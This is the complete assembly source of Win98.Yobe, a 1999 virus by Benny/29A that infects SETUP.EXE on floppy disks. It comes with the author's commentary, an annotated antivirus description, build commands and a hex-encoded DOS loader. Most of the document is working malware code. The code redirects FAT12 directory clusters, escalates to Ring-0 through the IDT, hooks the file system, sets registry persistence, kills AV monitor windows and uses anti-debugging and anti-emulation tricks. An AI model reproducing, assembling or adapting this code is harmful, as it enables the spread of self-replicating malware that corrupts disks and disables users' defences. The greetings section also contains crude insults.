?????????????????????????????????????????????????????????????????[yobe.asm]???
;						      ??????? ??????? ???????
;                                                     ??? ??? ??? ??? ??? ???
;          Win98.Yobe.24576	                      ??????  ??????? ???????
;          by Benny/29A                               ??????? ??????? ??? ???
;                                                     ??????? ??????? ??? ???
;                                                    
;
;
;Author's description
;?????????????????????
;
;Hey reader! R u st0ned or drunk enough? If not, then don't read this, coz this
;is really crazy. Let me introduce u FIRST FAT12 infector (cluster/directory
;virus, this is also used to call), fully compatible with windozes (Win98)!
;No no, that's not enough. This is also resident, multithreaded in both of
;Ring-0 and Ring-3 levels with anti-debugging, anti-heuristic, anti-emulator and
;anti-monitor features, using Win9X backdoor to call DOS services and working
;with CRC32, Windows registry and API functions.
;Among all these features, I don't hope it has any chances to spread outta
;world. It infects only diskettes (A: only) and only one file - SETUP.EXE. More
;crazy than u thought, nah? Yeah, I'm lazy so I didn't want to test my code on
;my harddisk and I also didn't want to think about infication of more than one
;file. When I finished Win98.BeGemot, I was totally b0red of those stupid PE
;headerz, RVAs and such like. I wanted to code something really original, not
;next average-b0ring virus. I hope I successed. This virus doesn't demonstrate
;only porting old techniques (c Dir-II virus) to new enviroment, but also
;hot-new techniques (e.g. Ring0 threads). To be this virus really heavilly
;armoured is missing some poly/meta engine. Unfortunately, this conception of
;virus doesn't allow me to implement such engines (neither compression), coz
;I can't modify virus code. However, I included many usefull trix to fool
;debuggerz as well as heuristic scannerz. Bad thing is that this babe is
;detectable by NODICE32 - NODICE32 can find suspicious code (such as modifying
;IDT) and so it immediately reports an unknown virus. There ain't chance to
;improve it, coz I can't use any kind of encryption. Fortunately, other AVs
;find sh!t :D. I hope u will like this piece of work (it took me much time to
;code it, albeit it is very small (code is small, headerz r huge :) and
;optimized) and u will learn much from that. U want probably ask me, why I didn't
;coded stealth virus. U r right, It's easy to implement full-stealth mechanism,
;but, but, ... I won't lie u - I'm lazy :).
;Gimme know, if u will have any comments, if u will find any bugs or anything
;else...thnx.
;
;
;
;What will happen on execution ?
;???????????????????????????????-
;
;Virus will:
;1)	Setup up SEH frame
;2)	Check for CRC32 of virus body
;3)	Check for application level debugger
;4)	Reset SEH frame and run anti-heuristic code
;5)	Kill some AV monitors (AVP, AMON) + some anti-heuristic code
;6)	Check for SoftICE
;7)	Copy virus to internal buffer, create new Ring-3 thread and wait for
;	its termination
;8)	-	Jump to Ring-0 (via IDT)
;9)	-	Check for residency and install itself to memory
;10)	-	Quit from Ring-0
;11)	Restore host
;12)	Execute host
;13)	Restore host, so host will be infected again
;14)	Set registry key, so virus will be executed everytime windows will
;	start
;15)	Check for payload activation time
;16)	-	Do payload
;17)	Remove SEH frame and quit
;
;
;Virus in memory will:
;1)	Check file name
;2)	Create new Ring-0 thread and wait for its termination
;3)	-	Check for drive parameters (BOOT sector check)
;4)	-	Check for free space (FAT check)
;5)	-	Redirect cluster_ptr in directory structure (ROOT)
;6)	-	Write virus to the end of DATA area
;7)	-	Save back FAT, ROOT and SAVE area (internally used by virus)
;8)	-	Terminate Ring-0 thread
;9)	Pass control to next IFS hooker
;
;
;
;Payload
;????????
;
;In possibility 1:255, virus will show icon on the left side of the screen and
;will rotate with it. U will c, how light-snake will be rolled on the screen.
;User will be really impressed! X-D I still can't stop watching it, it really
;hipnotized me ! :DDDDD.
;
;
;
;Known bugs
;???????????
;
;My computer will sometimes hang while system will try to read infected file.
;Maybe old FD drive, maybe some bugz in virus code. This appear only on my
;computer, so I hope it is error on my side.
;
;
;
;AVP's description
;??????????????????
;
;Benny's notes: This is much better description than at BeGemot virus. However,
;I would have some notes, see [* *] marx:
;
;
;Win95.Yobe [* Fully compatible with Win98, so why Win95? *]
;
;This is a dangerous [* why dangerous?! *] memory resident parasitic Windows
;virus. It uses system calls that are valid under Win95/98 only and can't spread
;under NT. The virus also has bugs and often halts the system when run [* when,
;where, why? *]. Despite on this the virus has very unusual way of spreading,
;and it is interesting enough from technical point of view [* I hope it is *].
;The virus can be found only in two files: "SETUP.EXE" on floppy disks and
;"SETUP .EXE" in the root of the C: drive (there is one space between file name
;and ".EXE" extension). 
;
;On the floppy disks the virus uses a trick to hide its copy. It writes its
;complete code to the last disk sectors and modifies the SETUP.EXE file to read
;and execute this code.
;
;The infected SETUP.EXE file looks just as 512 bytes DOS EXE program, but it is
;not. While infecting this file the virus uses "DirII" virus method: by direct
;disk sectors read/write calls the virus gets access to disk directory sectors,
;modifies "first file cluster" field and makes necessary changes in disk FAT
;tables. As a result the original SETUP.EXE code is not modified, but the
;directory entry points to virus code instead of original file clusters. 
;
;When the infected SETUP.EXE is run from the affected floppy disk this DOS
;component of the virus takes control, reads the complete virus body from the
;last sectors on the floppy disk, then creates the "C:\SETUP .EXE" file, writes
;these data (complete virus code) to there and executes. The virus installation
;routine takes control then, installs the virus into the system and disinfect
;the SETUP.EXE file on the floppy drive. 
;
;While installing itself into the system the virus creates [* opens *] the new
;key in the system registry to activate itself on each Windows restart: 
;
; HKLM\Software\Microsoft\Windows\CurrentVersion\Run 
;  YOBE=""C:\SETUP .EXE" YOBE"
;
;The virus then switches to the Windows kernel level (Ring0), allocates a block
;of system memory, copies itself to there and hooks disk file access Windows
;functions (IFS API). This hook intercepts file opening calls and on opening
;the SETUP.EXE file on the A: drive the virus infects it. 
;
;The virus has additional routines. First of them looks for "AVP Monitor" and
;"Amon Antivirus Monitor" windows and closes them; the second one depending on
;random counter displays the line with the words "YOBE" to the left side of the
;screen [* this is usually called as payload :D *].
;
;
;
;Greetz
;???????
;
;	B0z0		-	Huh, guy, why don't u stay in VX and write
;				another Padania virus? Just last one ;))
;	Billy Belcebu	-	Come to .cz! :D
;	BitAddict	-	Nice to met ya. Kewl to met old TriDenTer.
;	Darkman		-	Thank u for that wonderful book. It really
;				r0x0r!!!
;	Eddow		-	Would like to meet ya on IRC!
;	GriYo		-	Hey man, just reply me once.
;	Itchi		-	Drink, smoke and fuck again! :) Be back and
;				learn to code, pal!
;	Kaspersky	-	U cocksucker, where did u lose the description
;				of BeGemot?!!
;	Reptile		-	Smoke, smoke, smoke. This virus is really
;				st0ned :D. Btw, still working on macro stuph? ;)
;	StarZer0	-	Bak infectorz aren't problem :D. Now, when I
;				finished FAT12 inf., I will try to code
;				multithreaded .txt infector ;)))
;			-	Fibers r cool, but threads rulez!!!
;	The_Might       -\
;	MidNyte		- >	F0rk me a joint pleeeeeeaaazzzzz! :D
;	Rhape97         -/
;	All-nonsmokerz	-	Why do u drink and drive, when u can smoke
;				and fly? X-DDD
;	W33D		-	Thanx for inspiration, this virus is yourz,
;				hehe :D.
;	iKX stuph	-	Great work, men!!! XiNE#4 r0x0r!	
;
;
;
;How to build
;?????????????
;
;brcc32 yobe.rc
;tasm32 -ml -q -m9 yobe.asm
;tlink32 -Tpe -c -x -aa yobe,,, import32,,yobe.res
;pewrsec yobe.exe
;
;
;
;Who is YOBE?
;???????????????????????????
;
;Many ppl will now laugh me (hi Darkman!, hi Billy!) :DD. Yobe was human, which
;role is situated in Bible. Nah, don't beat me, I'm not catholic. I only like
;stories and ppl in Bible. Yobe was human, which lost his religion. Ehrm,
;let's imagine it as "he stopped believing in what he believed". Story is all
;about that u shouldn't stop believe in what u believe. If u believe in better
;world, don't stop believing in it and do everything to become it truth, don't
;resignate. This ain't only about catholisism, it's about life and utophy.
;But NOW pick up your lazy ass and do anything, anything u think it's right,
;otherwise u won't get what u want!
;
;
;
;(c) 1999 Benny/29A. Enjoy!



.386p						;386 protected opcodez
.model flat					;flat model, 32bit offset


include win32api.inc				;include some structures


PC_WRITEABLE    equ     00020000h               ;equates used
PC_USER         equ     00040000h               ;in installation
PR_SHARED       equ     80060000h               ;stage
PC_PRESENT	equ	80000000h
PC_FIXED	equ	00000008h
PD_ZEROINIT	equ	00000001h

IFSMgr_GetHeap	equ     0040000Dh		;used services
IFSMgr_Ring0_FileIO	equ     00400032h
IFSMgr_InstallFileSystemApiHook equ     00400067h
UniToBCSPath	equ	00400041h
VMMCreateThread	equ	00010105h
VMMTerminateThread	equ	00010107h
_VWIN32_CreateRing0Thread	equ	002A0013h
IFSMgr_Ring0_FileIO	equ	00400032h


mem_size        equ     (virus_end-Start+0fffh+24576)/1000h
						;size of virus in memory

VxDCall macro  VxDService              		;macro to call VxDCall
        int     20h
        dd      VxDService
	endm


extrn CreateFileA:PROC				;import APIz used by virus
extrn DeviceIoControl:PROC
extrn ExitProcess:PROC
extrn CloseHandle:PROC
extrn GetModuleFileNameA:PROC
extrn ReadFile:PROC
extrn CreateProcessA:PROC
extrn CopyFileA:PROC
extrn WaitForSingleObject:PROC
extrn DeleteFileA:PROC
extrn CreateThread:PROC
extrn GetCommandLineA:PROC
extrn RegCreateKeyExA:PROC
extrn RegSetValueExA:PROC
extrn RegCloseKey:PROC
extrn LoadIconA:PROC
extrn GetDC:PROC
extrn DrawIcon:PROC
extrn IsDebuggerPresent:PROC
extrn FindWindowA:PROC
extrn PostMessageA:PROC



.data						;data section
	VxDName	db	'\\.\vwin32',0		;vwin32 driver name
	srcFile	db	'a:\setup.exe',0	;virus locations
	dstFile	db	'c:\setup.exe',0	;on disk
	regFile	db	'"C:\SETUP .EXE" '	;in registry
	regVal	db	'YOBE',0
regSize = $-regFile
	subKey	db	'Software\Microsoft\Windows\CurrentVersion\Run',0
	sICE	db	'\\.\SICE',0		;SoftICE driver name
	ShItTyMoNs:                    		;monitors to kill
		db	'AVP Monitor',0
		db	'Amon Antivirus Monitor',0
	lpsiStartInfo	db	64		;used by CreateProcessA
			db	63 dup (?)
	regCont:				;registers passed to API
	regEBX	dd	offset ROOT
	regEDX	dd	19
	regECX	dd	14
	regEAX	dd	?
	regEDI	dd	?
	regESI	dd	?
	regFLGS	dd	?
	tmp	dd	?			;variable requiered by API
	org tmp
	hKey	dd	?			;key to registry
	lppiProcInfo:
	hProcess	dd	?		;handle to new process
	hThread		dd	?		;handle to new thread
	dwProcessID	dd	?		;ID of process
	dwThreadID	dd	?		;ID of thread
	vbuffer	db	24576 dup (?)		;buffer filled with virus file
	org vbuffer
	fname	db	256 dup (?)		;name of virus file
ends						;end of data section


.code						;code section
Start:						;virus body starts here
	@SEH_SetupFrame 		;setup SEH frame
	mov esi, offset _crc_			;start of block
	mov edi, crc_end-_crc_			;size of block
	call CRC32				;check code integrity
	cmp eax, 0DACA92DCh			;CRC32 match?
_crc_=$
	jne r_exit				;no, quit (anti-breakpoint)
	call IsDebuggerPresent			;check if any application level
	test eax, eax				;based debugger is present
	jne exit				;yeah, quit - anti-debugger
	mov [eax], ebx				;cause stack overflow exception
	jmp r_exit				;- anti-emulator
seh_jmp:@SEH_RemoveFrame            		;reset SEH handler
	@SEH_SetupFrame 		;...
	mov eax, cs				;load CS selector
	xor al, al				;only LSB is set under WinNT
	test eax, eax				;is WinNT active
	je r_exit				;yeah, quit
	db	0d6h				;anti-emulator
	mov eax, esp				;save ESP to EAX
	push cs					;save CS to stack
	pop ebx					;get it back to EBX
	cmp esp, eax				;match?
	jne r_exit				;no, quit - anti-emulator

	mov eax, fs:[20h]			;get debugger context
	test eax, eax				;is there any?
	jne exit				;yeah, quit - anti-debugger

	mov esi, offset ShItTyMoNs		;pointer to stringz
        xor edi, edi                            ;to AV monitors
	push 2					;2 monitors
        pop ecx                                 ;...
KiLlMoNs:
	push ecx				;save counter
	push esi				;AV string
	push edi				;NULL
        call FindWindowA			;find window
        test eax, eax                           ;found?
        je next_mon                             ;no, try to kill other monitor
        push edi                                ;now we will send message
        push edi                                ;to AV window to kill itself
        push 12h                                ;veeeeeeery stupid X-DD
	push eax
        call PostMessageA			;bye bye, hahaha
next_mon:
        sub esi, -0ch                           ;next monitor string
	pop ecx					;restore counter
        loop KiLlMoNs                           ;kill another one, if present

	push cs					;store CS
	push offset anti_l			;store offset to code
	retf					;go there - anti-emulator

CRC32:  push ebx                                ;I found this code in Int13h's
        xor ecx, ecx                            ;tutorial about infectin'
        dec ecx                                 ;archives. Int13h found this
        mov edx, ecx                            ;code in Vecna's Inca virus.
NextByteCRC:                                    ;So, thank ya guys...
        xor eax, eax                            ;Ehrm, this is very fast
        xor ebx, ebx                            ;procedure to code CRC32 at
        lodsb                                   ;runtime, no need to use big
        xor al, cl                              ;tables.
	mov cl, ch
	mov ch, dl
	mov dl, dh
	mov dh, 8
NextBitCRC:
	shr bx, 1
	rcr ax, 1
	jnc NoCRC
	xor ax, 08320h
	xor bx, 0edb8h
NoCRC:  dec dh
	jnz NextBitCRC
	xor ecx, eax
	xor edx, ebx
        dec edi
	jne NextByteCRC
	not edx
	not ecx
	pop ebx
	mov eax, edx
	rol eax, 16
	mov ax, cx
	ret

anti_l:	mov edi, offset sICE			;pointer to SoftICE
	call OpenDriver				;try to open its driver
	jne exit				;SICE present, quit - anti-debugger
	
	mov esi, offset fname			;where to store virus filename
	push 256				;size of filename
	push esi				;ptr to filename
	push 400000h				;base address of virus
	call GetModuleFileNameA			;get virus filename
	test eax, eax				;error?
	je exit					;yeah, quit

	xor eax, eax
	push eax
	push eax
	push OPEN_EXISTING
	push eax
	push FILE_SHARE_READ
	inc eax
	ror eax, 1
	push eax
	push esi
	call CreateFileA			;open virus file
	inc eax					;error?
	je exit					;yeah, quit
	dec eax
	xchg eax, esi
	push 0
	push offset tmp
	push 24576				;size of virus file
	push offset vbuffer			;ptr to buffer
	push esi
	call ReadFile				;copy virus file to buffer
	push eax
	push esi
	call CloseHandle			;and close virus file
	pop ecx	
	jecxz exit

	xor eax, eax
	push offset tmp
	push eax
	push eax
	push offset NewThread
	push eax
	push eax         			;create new thread and let virus
	call CreateThread			;code continue there
	test eax, eax				;error?
	je exit					;yeah, quit
	mov word ptr [t_patch], 9090h		;allow execution of code -
	push eax				; - anti-emulator
	call CloseHandle			;close handle of thread
crc_end=$
e_patch:jmp $					;this will be patched by thread
						; - anti-emulator
exit:	call GetCommandLineA			;get command-line
	xchg eax, esi				;to esi
	lodsb					;load byte
	cmp al, '"'				;is it " ? If not, virus filename
	jne regSet				;ain't long one - anti-AVer
lchar:	lodsb					;load next byte
	cmp al, '"'				;is it " ?
	jne lchar				;no, continue
_lchar:	lodsb					;load byte
	cmp al, ' '				;is it space?
	je _lchar				;yeah, continue
	test al, al				;is there any parameter?
	jne regSet				;yeah, virus is loaded from
						;C: drive -> no jump to host

	mov edi, offset VxDName			;pointer to vwin32
	call OpenDriver				;open driver
	je regSet				;if error, quit
	dec eax
	mov [d_handle], eax			;store handle
	mov eax, offset ROOT			;buffer for reading ROOT
	push eax       				;save ptr
	call I25hSimple				;read ROOT
	pop ebp					;get it back
	jc c_exit				;if error, then quit

_f_cmp:	mov esi, ebp				;get ptr to ROOT
	push esi
	lodsd
	test eax, eax				;ZERO?
	pop esi
	je c_exit				;yeah, no more filez, quit

	push 11					;size of filename (8+3)
	pop edi					;to EDI
	call CRC32				;calculate CRC32
	cmp eax, 873F6A26h			;match?
	je _fn_ok				;yeah, try to restore file
	sub ebp, -20h				;no, get next directory record
	jmp _f_cmp				;and try again
_fn_ok:	mov edi, offset save			;load SAVE area sector from disk
	mov [regEBX], edi
	mov [regEDX], 2880-1			;SAVE area = last sector in disk
	mov [regECX], 1				;one sector to read
	call I25h				;read it
	jc c_exit				;if error, then quit

	push word ptr [ebp+1ah]			;store cluster_ptr
	push dword ptr [ebp+1ch]		;store filesize
	push word ptr [edi]			;restore cluster_ptr
	pop word ptr [ebp+1ah]			;...
	push dword ptr [edi+2]			;restore filesize
	pop dword ptr  [ebp+1ch]		;...
	call WriteROOT				;restore directory record
	pop dword ptr [ebp+1ch]			;restore filesize
	pop word ptr [ebp+1ah]			;restore cluster_ptr
	jc c_exit				;if error, then quit

	mov ebx, offset dstFile			;destination path+filename
	push 0
	push ebx
	push offset srcFile			;source path+filename
	call CopyFileA				;copy virus from A: to C: drive
	xchg eax, ecx				;error?
	jecxz err_cpa				;yeah, quit

	xor eax, eax
	push offset lppiProcInfo
	push offset lpsiStartInfo
	push eax
	push eax
	push eax
	push eax
	push eax
	push eax
	push eax
	push ebx
	call CreateProcessA			;execute original file (host)
	xchg eax, ecx				;error?
	jecxz err_cpa				;yeah, quit

	mov ebp, [hProcess]			;get handle of host process
	push -1					;wait for its signalisation
	push ebp				;...
	call WaitForSingleObject		;...
	
	push ebp
	call CloseHandle			;close handle of host process
	push dword ptr [hThread]
	call CloseHandle			;close handle of host thread

err_cpa:call WriteROOT				;restore ROOT
	push ebx
	call DeleteFileA			;and delete host from C: drive

c_exit:	push 12345678h				;get handle of vwin32 driver
d_handle = dword ptr $-4
	call CloseHandle			;and close it

regSet:	push offset tmp
	push offset hKey
	push 0
	push 3
	push 0
	push 0
	push 0
	push offset subKey
	push 80000002h
	call RegCreateKeyExA			;open registry
	test eax, eax
	jne r_exit

	push regSize
	push offset regFile
	push 1
	push 0
	push offset regVal
	mov ebx, dword ptr [hKey]
	push ebx           			;set key - virus will be executed
	call RegSetValueExA			;everytime Windows will start
	push ebx
	call RegCloseKey			;close registry

	dw	310fh				;RDTCS
	cmp al, 'Y'				;1:255 possibility
	jne r_exit				;payload won't be activated

payload:push 0					;payload will be activated
	call GetDC				;get device context of desktop
	xchg eax, ebx				;save HDC to EBX
	push 29ah				;ID of icon
	push 400000h				;base of virus
	call LoadIconA				;load icon
	xor edx, edx				;EDX=0
l_payload:
	pushad					;store all registers
	push eax				;icon handle
	push edx				;Y possition
	push 0					;X possition
	push ebx				;device context handle
	call DrawIcon				;draw icon on desktop
	popad					;restore all registers
	sub edx, -30				;increment Y possition
	loop l_payload				;long payload :)

r_exit:	@SEH_RemoveFrame			;remove SEH frame
	push 0
	call ExitProcess			;and exit

NewThread:
	pushad					;store all registers
t_patch:jmp $					;will be patched - anti-emulator
	call EnterRing0				;jmp to Ring-0
	pushad					;store all registers
	mov eax, dr0				;get debug register
	cmp eax, 'YOBE'				;check if we r already resident
	je quitR0				;yeah, quit

	push 24576
	VxDCall IFSMgr_GetHeap			;alocate memory for our virus
	pop edx					;correct stack
	xchg eax, edi				;get address to EDI
	test edi, edi				;error?
	je quitR0				;yeah, quit

	push edi				;copy virus file to memory
	mov esi, offset vbuffer			;from
	mov ecx, 24576/4			;how many
	rep movsd				;move!
	pop ebp
	
	mov [ebp + 600h+membase-Start], ebp	;save address
	lea eax, [ebp + 600h+NewIFSHandler-Start]
	push eax				;pointer to new handler
	VxDCall IFSMgr_InstallFileSystemApiHook	;install file system hook
	pop edx					;correct stack
	mov [ebp + 600h+OldIFSHandler-Start], eax
	mov eax, 'YOBE'				;mark debug register as "already
	mov dr0, eax				;resident flag" - anti-debugger
quitR0:	mov dword ptr [p_jmp], 90909090h	;patch code - anti-emulator
	popad					;restore all registers
	iretd					;and quit from Ring-0

EnterRing0:                                     ;Ring0 port
        pop eax                                 ;get address
        pushad                                  ;store registers
        sidt fword ptr [esp-2]                  ;load 6byte long IDT address
        popad                                   ;restore registers
        sub edi, -(8*3)                         ;move to int3
        push dword ptr [edi]                    ;save original IDT
        stosw                                   ;modify IDT
        inc edi                                 ;move by 2
        inc edi                                 ;...
        push dword ptr [edi]                    ;save original IDT
        push edi                                ;save pointer
        mov ah, 0eeh                            ;IDT FLAGs
        stosd                                   ;save it
        push ds                                 ;save some selectors
        push es                                 ;...
        int 3                                   ;JuMpToRiNg0!
        pop es                                  ;restore selectors
        pop ds                                  ;...
        pop edi                                 ;restore ptr
        add edi, -4                             ;move with ptr
        pop dword ptr [edi+4]                   ;and restore IDT
        pop dword ptr [edi]                     ;...
p_jmp:  inc eax                                 ;some silly loop to fool
        cdq                                     ;some AVs. Will be overwritten
        jmp p_jmp                               ;with NOPs l8r by int handler
	mov word ptr [e_patch], 9090h		;again, new overwriting of code
	popad					; - anti-emulator
	ret					;restore all registers and quit

OpenDriver:
	xor eax, eax
	push eax
	push 4000000h
	push eax
	push eax
	push eax
	push eax
	push edi
	call CreateFileA			;open driver
	inc eax					;increment handle
	ret					;quit

NewIFSHandler:					;file system handler
	enter 20h, 0				;reserve space in stack
	push dword ptr [ebp+1ch]		;for parameters
	push dword ptr [ebp+18h]
	push dword ptr [ebp+14h]		;store parameters
	push dword ptr [ebp+10h]		;for next handler
	push dword ptr [ebp+0ch]
	push dword ptr [ebp+08h]

	cmp dword ptr [ebp+0ch], 24h		;open?
	jne quitHandler				;no, quit

	pushad					;store all registers
	call gdlta				;get delta offset
gdelta:	db	0b8h				;prefix - anti-disassembler
gdlta:	pop ebx					;and anti-lamer

	xor ecx, ecx				;ECX=0
	mov cl, 1				;ECX=0 or 1
semaphore = byte ptr $-1
	jecxz exitHandler			;semaphore set? then quit
	mov byte ptr [ebx + semaphore - gdelta], 0
						;set semaphore
        lea edi, [ebx + filename - gdelta]	;get filename
	mov al, [ebp+10h]			;get disk no.
	dec al					;is it A: ?
	jne exitHandler				;no, quit
	mov al, 'A'				;add A letter
	stosb					;store it
	mov al, ':'				;add : letter
	stosb					;store it

wegotdrive:
	xor eax, eax
	push eax
	inc ah
	push eax
	mov eax, [ebp+1ch]
	mov eax, [eax+0ch]
	sub eax, -4
	push eax
	push edi
	VxDCall UniToBCSPath			;convert UNICOE filename to ANSI
	sub esp, -10h				;correct shitty stack
	mov byte ptr [edi+eax], 0		;and terminate filename with \0

	mov esi, edi
	dec esi
	dec esi
	xchg eax, edi
	inc edi
	inc edi
	inc edi
	call CRC32				;calculate CRC32 of filename
	cmp eax, 0B4662AD0h			;is it "A:\SETUP.EXE,0" ?
	je setup_exe				;yeah, continue

exitHandler:
	mov byte ptr [ebx + semaphore - gdelta], 1	;set semaphore
	popad						;restore all registers
quitHandler:
	mov eax, 12345678h
OldIFSHandler = dword ptr $-4
	call [eax]				;jump to next handler
	sub esp, -18h				;correct stack
	leave
	ret					;and quit

setup_exe:
	mov ecx, 1000h				;thread stack
	lea ebx, [ebx + Thread_Infect - gdelta]	;address of thread proc
	xor esi, esi				;next crappy parameter
	VxDCall _VWIN32_CreateRing0Thread	;create new Ring-0 thread
	jmp exitHandler				;and quit
						; - anti-everything
	db	0b8h				;prefix - anti-disassembler
Thread_Infect:					;Ring-0 thread proc
	pushad					;store all registers
	jmp ti_next				;jump over
	db	3 dup (?)			;leave code be overwritten
ti_next:call tigdelta				;get delta offset
ti_gdelta	db	0b8h			;next prefix
tigdelta:
	pop ebx
	xor ecx, ecx
	inc ecx
	lea esi, [ebx + BOOT - ti_gdelta]	;read BOOT sector
	call Int25h
	jc exit_thread

	cmp [ebx + BOOT+0bh - ti_gdelta], 01010200h	;check, if diskette is 
	jne exit_thread					;1,44MB, check FAT and
	cmp word ptr [ebx + BOOT+0fh - ti_gdelta], 0200h;ROOT possition
	jne exit_thread
	push 9
	pop ecx
	cmp word ptr [ebx + BOOT+16h - ti_gdelta], cx	;...
	jne exit_thread				;no, its not 1,44MB FD

	lea esi, [ebx + FAT - ti_gdelta]
	inc edx
	call Int25h				;read FAT
	cmp byte ptr [esi], 0f0h		;check if it is 1,44MB
	jne exit_thread				;no, quit


	lea edi, [ebx + FAT+4223 - ti_gdelta]	;check FAT, if last sectors r
	mov ebp, edi				;free
	xor eax, eax
sFAT:	scasd
	jne exit_thread				;no, quit
	loop sFAT

	mov edi, ebp				;now we will mark FAT, last
	inc edi					;sectors will be marked as
	mov eax, 0ff0ff00h			;RESERVED
	push 73					;coz we infect 12bit FAT, we
	pop ecx					;use this loop to mark it so
markFAT:ror eax, 8
	test al, al
	je markFAT
	stosb
	loop markFAT
	mov byte ptr [edi], 0fh			;mark end

	call ROOTinit
	call Int25h				;read ROOT

f_cmp:	mov esi, ebp				;get ptr to ROOT          
	push esi                              
	lodsd                                 
	test eax, eax				;ZERO?
	pop esi                               
	je exit_thread				;yeah, no more filez, quit

	push 11
	pop edi
	call CRC32				;calculate CRC32 of file
	cmp eax, 873F6A26h			;is it SETUP.EXE?
	je fn_ok                                ;yeah, continue
	sub ebp, -20h				;no, process next directory rec.
	jmp f_cmp				;...
fn_ok:	mov ax, [ebp+1ah]			;save cluster_ptr
	mov [ebx + save - ti_gdelta], ax
	mov eax, [ebp+1ch]			;save filesize
	mov [ebx + save+2 - ti_gdelta], eax
	mov word ptr [ebp+1ah], 2800		;new cluster_ptr
	mov dword ptr [ebp+1ch], 512		;new filesize

	xor ecx, ecx
	inc ecx
	lea esi, [ebx + loader - ti_gdelta]
	mov edx, 2880-49
	call Int26h				;write DOS loader

	push 42
	pop ecx
	mov esi, [ebx + membase - ti_gdelta]
	mov edx, 2880-48			;write virus
	call Int26h

	xor ecx, ecx
	inc ecx
	lea esi, [ebx + save - ti_gdelta]
	mov edx, 2880-1
	call Int26h				;write SAVE area

	call ROOTinit
	call Int26h				;write ROOT

	push 9
	pop ecx
	lea esi, [ebx + FAT - ti_gdelta]
	xor edx, edx
	inc edx
	pushad
	call Int26h				;write first FAT
	popad
	sub dl, -9
	call Int26h				;write second FAT

exit_thread:
	popad					;restore all registers
	ret					;and exit


ROOTinit:					;procedure to initialize
	push 14					;registers for reading/writing
	pop ecx					;ROOT
	push 19
	pop edx
	lea esi, [ebx + ROOT - ti_gdelta]
	mov ebp, esi
	ret

Int26h: mov eax, 0DE00h				;write sectors
	jmp irfio	
Int25h:	mov eax, 0DD00h				;read sectors
irfio:	VxDCall IFSMgr_Ring0_FileIO
	ret

WriteROOT:					;code used to write sectorz
	mov [regEBX], offset ROOT		;pointer to ROOT field
	mov [regEDX], 19			;sector number of ROOT
	mov [regECX], 14			;sectors to write
I26h:	mov [p2526], 3				;set WRITE mode
	jmp i2526				;continue
I25h:	mov [p2526], 2				;set READ mode
i2526:	and [regEAX], 0				;zero EAX
I25hSimple:
	push 0
	push offset tmp
	push 28
	push offset regCont
	push 28
	push offset regCont
	push 2
p2526 = byte ptr $-1
	push dword ptr [d_handle]
	call DeviceIoControl			;backdoor used to call DOS services
	xchg eax, ecx				;error?
	jecxz q2526h				;yeah, set CF and quit
	clc					;clear CF
	ret					;quit
q2526h:	stc					;set CF
	ret					;and quit


	loader:					;DOS loader
	include	loader.inc
	ldrsize = $-loader			;size of DOS loader
	membase	dd	'YYYY'		;address, where is virus placed in memory
	filename	db	100h dup ('Y')	;filename
	save	db	512 dup ('Y')		;save area
	BOOT	db	512 dup ('Y')		;BOOT
	FAT	db	4608 dup ('Y')		;FAT
	ROOT	db	7168 dup ('Y')		;ROOT
virus_end:					;virus ends here
ends						;end of code section
End Start					;thats all f0lx ;)
?????????????????????????????????????????????????????????????????[yobe.asm]???
???????????????????????????????????????????????????????????????[LOADER.INC]???
		dd 5A4Dh
		dd 1
		dd 5410010h
		dd 0FFFFh
		dd 0
		dd 0
		dd 1Ch
		dd 0
		dd 0
		dd 0
		dd 0
		dd 0
		dd 0
		dd 0
		dd 0
		dd 0
		dd 0
		dd 0
		dd 0
		dd 0
		dd 0
		dd 0
		dd 0
		dd 0
		dd 0
		dd 0
		dd 0
		dd 0
		dd 0
		dd 0
		dd 0
		dd 0
		dd 0
		dd 0
		dd 0
		dd 0
		dd 0
		dd 0
		dd 0
		dd 0
		dd 0
		dd 0
		dd 0
		dd 0
		dd 0
		dd 0
		dd 0
		dd 0
		dd 0
		dd 0
		dd 0
		dd 0
		dd 0
		dd 0
		dd 0
		dd 0
		dd 0
		dd 0
		dd 0
		dd 0
		dd 0
		dd 0
		dd 0
		dd 0
		dd 8EC0331Eh
		dd 901EC4D8h
		dd 1E892E00h
		dd 8C2E008Dh
		dd 0C7008F06h
		dd 9B009006h
		dd 920E8C00h
		dd 1F0E0E00h
		dd 2AB907h
		dd 0BB0B10BAh
		dd 25CD00CBh
		dd 0B8587258h
		dd 0DB33716Ch
		dd 0BAC93343h
		dd 9EBE0012h
		dd 7221CD00h
		dd 40B49346h
		dd 0B900CBBAh
		dd 21CD6000h
		dd 3EB43972h
		dd 2E0721CDh
		dd 0BF068Ch
		dd 48BB4AB4h
		dd 1E21CD05h
		dd 77168C06h
		dd 7C268900h
		dd 0B8070E00h
		dd 0BBBB4B00h
		dd 0ACBA00h
		dd 34B821CDh
		dd 0BCD08E12h
		dd 1F071234h
		dd 0ACBA41B4h
		dd 3321CD00h
		dd 66D88EC0h
		dd 34567868h
		dd 68F6612h
		dd 0B80090h
		dd 0B021CD4Ch
		dd 3A43CF03h
		dd 5445535Ch
		dd 2E205055h
		dd 455845h
		dd 535C3A43h
		dd 50555445h
		dd 452E317Eh
		dd 4558h
		dd 8100h
		dd 0FFFFFF00h
		dd 0FFFFFFFFh
		dw 0EFFh
		db    0
???????????????????????????????????????????????????????????????[LOADER.INC]???





